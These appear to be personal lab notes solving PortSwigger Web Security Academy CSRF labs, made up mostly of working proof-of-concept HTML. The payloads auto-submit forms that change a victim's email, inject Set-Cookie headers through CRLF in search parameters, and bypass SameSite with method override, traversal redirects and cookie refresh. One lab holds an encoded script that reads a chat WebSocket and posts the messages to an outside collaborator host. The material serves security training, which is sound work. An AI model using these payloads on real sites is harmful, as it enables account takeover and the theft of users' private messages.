In order for a CSRF attack to be possible:

- A relavant action (like change user email)
- Cookie-based session handling
- No unpredictable request parameters

Right click on the request on BurpSuite > Engagement Tools > Generate CSRF PoC

Sample code for exploit POST method without user interaction.

```html
<html>
  <!-- CSRF Proof of Concept - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://0a6700f303f565ad8084c11d00dc0027.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://example.com/?search=term%0d%0aSet-Cookie:%20csrf=tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" onerror="document.forms[0].submit();"/>
  </body>
</html>
```

## Lab: CSRF where token is tied to non-session cookie

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0ad0007d048dba7b812f11c5009f000b.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="wien4444444444444444er&#64;normal&#45;user&#46;net" />
      <input type="hidden" name="csrf" value="Z61L1WsHmOUxVTOYlwhnxvG81KzBXZez" />
      <input type="submit" value="Submit request" />
     <img src="https://0ad0007d048dba7b812f11c5009f000b.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=FQRdNpHOyU06HrOxhD8OofnOqJSX66zN%3b%20SameSite=None" onerror="document.forms[0].submit()">
    </form>
  </body>
</html>
```



## Lab: CSRF where token is duplicated in cookie

On this lab, server-side on check for Cookie and body is the same.

This lab's email change functionality is vulnerable to CSRF. It attempts to use the insecure "double submit" CSRF prevention technique.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: `wiener:peter`

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a4a004f043ae13d804cd0d200e600cf.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="nonnnnnnnner&#64;normal&#45;user&#46;net" />
      <input type="hidden" name="csrf" value="ywYvnEJIfYeKoWwBNmK8SiUA3dJ2OOWD" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://0a4a004f043ae13d804cd0d200e600cf.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=ywYvnEJIfYeKoWwBNmK8SiUA3dJ2OOWD%3b%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>
```


## Lab: SameSite Lax bypass via method override

Override GET method with the `_method` parameter

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a50008c0380720880c33508006100de.web-security-academy.net/my-account/change-email">
      <input type="hidden" name="email" value="wie223423434ner&#64;normal&#45;user&#46;net" />
      <input type="hidden" name="&#95;method" value="POST" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```

## Lab: SameSite Strict bypass via client-side redirect

```html
<script>
    document.location="https://0a13000204da9a0281d198d3005a0054.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=w11i45345345ner%40normal-user.net%26submit=1"
</script>


<script>
    document.location="https://0a13000204da9a0281d198d3005a0054.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=w11i45345345ner%40normal-user.net%26submit=1"
</script>
```


## Lab: SameSite Strict bypass via sibling domain

```html
<script>
    document.location = "https://cms-0a5300cb035a722d804b5dc700800053.web-security-academy.net/login?password=123&username=%3Cscript%3E%0A%20%20%20%20var%20ws%20%3D%20new%20WebSocket%28%27wss%3A%2F%2F0a5300cb035a722d804b5dc700800053%2Eweb%2Dsecurity%2Dacademy%2Enet%2Fchat%27%29%3B%0A%20%20%20%20ws%2Eonopen%20%3D%20function%28%29%20%7B%0A%20%20%20%20%20%20%20%20ws%2Esend%28%22READY%22%29%3B%0A%20%20%20%20%7D%3B%0A%20%20%20%20ws%2Eonmessage%20%3D%20function%28event%29%20%7B%0A%20%20%20%20%20%20%20%20fetch%28%27https%3A%2F%2Fhm730z86mqgy1makyotj99j31u7lvhj6%2Eoastify%2Ecom%27%2C%20%7Bmethod%3A%20%27POST%27%2C%20mode%3A%20%27no%2Dcors%27%2C%20body%3A%20event%2Edata%7D%29%3B%0A%20%20%20%20%7D%3B%0A%3C%2Fscript%3E";
</script>
```


## Lab: SameSite Lax bypass via cookie refresh

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a28009b03373cc3815afc6a0020003a.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="wi476576ener&#64;normal&#45;user&#46;net" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      window.onclick = () => {
          window.open('https://0a28009b03373cc3815afc6a0020003a.web-security-academy.net/social-login');
          setTimeout(changeEmail, 10000);
      }
      function changeEmail() {
          document.forms[0].submit();
      }
    </script>
  </body>
</html>

```

# Lab: CSRF with broken Referer validation


```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Referrer-Policy: unsafe-url
```

```html
<!--
	Body
-->
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a6d00bc04fce11181b42a5e0042009b.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="wieaaaaaaner&#64;normal&#45;user&#46;net" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState("", "", "/?0a6d00bc04fce11181b42a5e0042009b.web-security-academy.net")
      document.forms[0].submit();
    </script>
  </body>
</html>

```

# Lab: CSRF where Referer validation depends on header being present

```html
<html>
  <meta name="referrer" content="no-referrer">
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <head>
    <meta name="referrer" content="no-referrer">
  </head>
  <body>
    <form action="https://0a42007c03532b498111b100000a00c9.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="wi8en6575675er&#64;normal&#45;user&#46;netzz" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

